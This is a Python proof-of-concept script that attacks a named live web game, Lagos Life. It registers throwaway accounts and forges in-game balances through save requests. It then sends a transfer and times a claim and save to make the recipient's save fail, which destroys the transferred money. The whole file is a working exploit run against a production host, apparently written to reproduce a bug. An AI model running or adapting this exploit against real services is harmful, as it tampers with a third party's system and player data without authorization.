#!/usr/bin/env python3
"""
Lagos Life - DETERMINISTIC FUNDS LOSS via a destructive claim.

Mechanism (proven from the shipped bundle, not inferred):
  /api/family {action:"claim"} hands the transfer to the client AND removes it
  from the server inbox, WITHOUT applying any server-side credit.
  The credit is applied by the RECIPIENT'S CLIENT save.

  On a rejected save the client does NOT retry - it discards:
      onStaleSave(e => { let t=ob(e); t ? setElsewhere(...)
        : (loadLatest(ok(e)), toast("We loaded your latest saved game")) })
      where ob() strips the "__elsewhere" marker the server put in the 409 body.

So any failure after the claim destroys the money for BOTH parties.

This script forces the failure by claiming and saving in a tight window, so the
recipient's per-save allowance is still minimal.
"""
import json, urllib.request, urllib.error, http.cookiejar, copy, random, string, time

BASE = "https://lagoslife.eliysites.com"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/125.0 Safari/537.36")
GEN = json.load(open("/tmp/ll_genuine_save.json"))


class Acct:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        self.user = self.uid = None

    def raw(self, p, m="GET", b=None):
        h = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE, "Referer": BASE + "/"}
        d = None
        if b is not None:
            d = json.dumps(b).encode(); h["Content-Type"] = "application/json"
        r = urllib.request.Request(BASE + p, method=m, data=d, headers=h)
        try:
            with self.op.open(r, timeout=40) as resp:
                body = resp.read()
                return resp.status, (json.loads(body) if body else {}), body
        except urllib.error.HTTPError as e:
            body = e.read()
            try:
                return e.code, json.loads(body or b"{}"), body
            except Exception:
                return e.code, {}, body
        except Exception as e:
            return None, {"err": str(e)}, b""

    def api(self, p, m="GET", b=None):
        s, j, _ = self.raw(p, m, b)
        return s, j

    def create(self, money):
        self.user = "zzr" + "".join(random.choices(string.ascii_lowercase + string.digits, k=7))
        pw = "Probe!" + "".join(random.choices(string.ascii_letters + string.digits, k=14))
        self.api("/api/auth/register", "POST",
                 {"username": self.user, "password": pw, "name": "probe", "email": None, "adult": True})
        _, me = self.api("/api/auth/me")
        self.uid = (me.get("user") or {}).get("id")
        g = copy.deepcopy(GEN["game"]); g["sim"] = dict(g.get("sim") or {}); g["sim"]["name"] = self.user
        g["money"] = money
        self.api("/api/save", "PUT", {"game": g, "base": 0, "fresh": True})
        return self.state()

    def state(self):
        _, s = self.api("/api/save")
        return (s.get("game") or {}).get("money"), s.get("updatedAt"), s.get("game") or {}

    def money(self):
        return self.state()[0]


S = Acct(); R = Acct()
S0, _, _ = S.create(2_000_000)
R0, _, _ = R.create(500_000)
print(f"sender @{S.user} = N{S0:,}   recipient @{R.user} = N{R0:,}\n")

AMOUNT = 1_500_000
st, r = S.api("/api/send", "POST", {"to": R.uid, "amount": AMOUNT, "note": "destructive-claim test"})
print(f"[1] sender -> recipient N{AMOUNT:,}   HTTP {st}  {json.dumps(r)[:120]}")
S1 = S.money()
print(f"    sender   N{S0:,} -> N{S1:,}   (debited N{S0 - S1:,})")

# --- recipient ANCHORS: a no-op save, so its allowance window resets to ~0 ---
_, _, gR = R.state()
Ra, at_a, _ = R.state()
st_a, r_a = R.api("/api/save", "PUT", {"game": gR, "base": at_a})
print(f"\n[2] recipient anchors (no-op save)  HTTP {st_a}   base={at_a}   money=N{Ra:,}")

# --- claim + immediate credit save, tight window ---
st_c, r_c = R.api("/api/family", "POST", {"action": "claim"})
recv = (r_c or {}).get("received") or []
got = sum(int(x.get("amount") or 0) for x in recv)
print(f"[3] recipient CLAIMS            HTTP {st_c}   received N{got:,}")

Rm_after_claim = R.money()
print(f"    server balance right after claim: N{Rm_after_claim:,}   "
      f"(uncredited delta = N{Rm_after_claim - Ra:,})")

gg = copy.deepcopy(gR); gg["money"] = (gR.get("money") or 0) + got
st_p, r_p, raw_p = R.raw("/api/save", "PUT", {"game": gg, "base": at_a})
print(f"[4] recipient saves the credit  HTTP {st_p}   {json.dumps(r_p)[:200]}")
if st_p != 200:
    keys = sorted(r_p.keys()) if isinstance(r_p, dict) else []
    print(f"    <-- REJECTED. body keys = {keys}")
    if isinstance(r_p, dict) and "__elsewhere" in r_p:
        print(f"    server emitted __elsewhere = {json.dumps(r_p['__elsewhere'])}")
        print("    => the client strips it and calls loadLatest(server game): the credit is DISCARDED")

R1 = R.money()
print(f"\n[5] recipient balance after the client's recovery: N{R1:,}")

st_c2, r_c2 = R.api("/api/family", "POST", {"action": "claim"})
print(f"[6] second claim (is it recoverable?)  HTTP {st_c2}  {json.dumps(r_c2)[:150]}")

print("\n" + "=" * 88)
print("RESULT")
print("=" * 88)
print(f"  sender paid         N{S0 - S1:,}")
print(f"  recipient gained    N{R1 - R0:,}")
lost = (S0 - S1) - (R1 - R0)
print(f"  NET DESTROYED       N{lost:,}")
print(f"  recoverable?        {'NO - the inbox item is consumed' if not ((r_c2 or {}).get('received')) else 'yes'}")
json.dump({"sender_lost": S0 - S1, "recipient_gained": R1 - R0, "destroyed": lost,
           "amount": AMOUNT, "recipient": R.user, "sender": S.user,
           "save_rejected_with": st_p, "second_claim": r_c2},
          open("/tmp/ll_loss_repro.json", "w"), indent=2)
print("  -> /tmp/ll_loss_repro.json")
